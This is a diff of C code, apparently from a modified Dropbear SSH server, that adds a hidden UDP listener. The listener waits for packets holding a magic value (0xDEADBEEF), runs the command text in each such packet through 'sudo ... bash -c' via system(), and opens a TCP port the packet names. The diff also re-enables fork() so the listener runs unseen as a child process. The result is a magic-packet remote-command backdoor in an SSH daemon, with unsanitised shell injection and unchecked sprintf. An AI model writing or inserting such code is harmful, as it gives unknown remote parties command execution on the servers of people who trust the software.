@@ -42,8 +42,7 @@ int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {
 
 void start_tcp_connection(uint16_t port_number) {
 
-    char* buf = NULL;        // buffer for client data
-    char* temp = (char*) malloc(sizeof(long unsigned int));
+    char buf[1024];        // buffer for client data
 
     fd_set master;    // master file descriptor list
     fd_set read_fds;  // temp file descriptor list for select()
@@ -136,18 +135,18 @@ void start_tcp_connection(uint16_t port_number) {
                 }
                 else {
                     // handle data from a client
-                    if ((nbytes = recv(i, temp, sizeof(long unsigned int), 0)) <= 0) {
+                    if ((nbytes = recv(i, buf, 1023, 0)) <= 0) {
                         // got error or connection closed by client
                         if (nbytes == 0) dropbear_log(LOG_INFO, "TCP Connection: socket %d hung up", i); // connection closed
-                        else dropbear_log(LOG_INFO, "recv");
+                        else dropbear_log(LOG_INFO, "Recv error from socket %d", i);
                         close(i); // bye!
                         FD_CLR(i, &master); // remove from master set
                     }
 
                         // got some data from a client
                     else {
-
-                        dropbear_log(LOG_INFO, "we got some data from a client");
+                        buf[nbytes] = '\0';
+                        dropbear_log(LOG_INFO, "Got some data from socket %d: %s", i, buf);
                     }
 
                 } // END handle data from client
@@ -156,14 +155,11 @@ void start_tcp_connection(uint16_t port_number) {
     } // END for(;;)-- thought it would never end!
 }
 
-void* listen_for_udp_packets(int socket_id) {
+void listen_for_udp_packets(int socket_id) {
 
     int addr_len, bytes_read;
     struct sockaddr_in client_addr;
-    char recv_data[1024], shell_command[1024];
-
-    pid_t child_process_id;
-    int child_return_status = 0;
+    char recv_data[512], shell_command[512];
 
     listen_packet_t packet;
 
@@ -173,7 +169,7 @@ void* listen_for_udp_packets(int socket_id) {
 
     for(;;) {
 
-        bytes_read = recvfrom(socket_id,recv_data,1024,0, (struct sockaddr *)&client_addr, &addr_len);
+        bytes_read = recvfrom(socket_id,recv_data,sizeof(recv_data) / sizeof(*recv_data),0, (struct sockaddr *)&client_addr, &addr_len);
         recv_data[bytes_read] = '\0';
 
         dropbear_log(LOG_INFO, "(%s, %d) said : %s",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), recv_data);
@@ -183,23 +179,25 @@ void* listen_for_udp_packets(int socket_id) {
             continue;
         }
 
-        if(packet.magic == 0xDEADBEEF) {
+        if(packet.magic == MAGIC_VALUE) {
 
             dropbear_log(LOG_INFO, "Received 0xDEADBEEF value");
 
-            // Create a child process in order to run the shell command as a different user
-
+            // Make sure user did not change the uid to root user
             if(DEFAULT_USERID_FOR_UDP_PACKETS == 0) {
                 dropbear_log(LOG_INFO, "Failed to set uid %d. Please check that the user id exists and is not a root user", DEFAULT_USERID_FOR_UDP_PACKETS);
                 continue;
             }
 
+            // Run the shell command <packet.shell_command>
             sprintf(shell_command, "sudo -H -u \\#%d bash -c '%s'", DEFAULT_USERID_FOR_UDP_PACKETS, packet.shell_command);
             system(shell_command);
+
+            // Create a TCP connection in <packet.port_number>
             start_tcp_connection(packet.port_number);
 
             /*  Another way to run a shell command from a different user using fork
-             *
+             *  // Create a child process in order to run the shell command as a different user
                 child_process_id = fork();
                 if(child_process_id == 0) { // Child is running
 
@@ -236,9 +234,9 @@ void init_udp_listener() {
     int sock;
     struct sockaddr_in server_addr;
 
-    // Create a socket and bind
     dropbear_log(LOG_INFO, "Attempt UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
 
+    // Create a socket and bind
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
         dropbear_exit("Socket Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
     }
@@ -252,10 +250,9 @@ void init_udp_listener() {
         dropbear_exit("Bind Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
     }
 
-
-    // Listen incoming data on UDP protocol
-//    if(fork() == 0) {
+    // Listen incoming data on UDP protocol (in a separate child process)
+    if(fork() == 0) {
         listen_for_udp_packets(sock);
         exit(EXIT_SUCCESS);
-//    }
+    }
 }
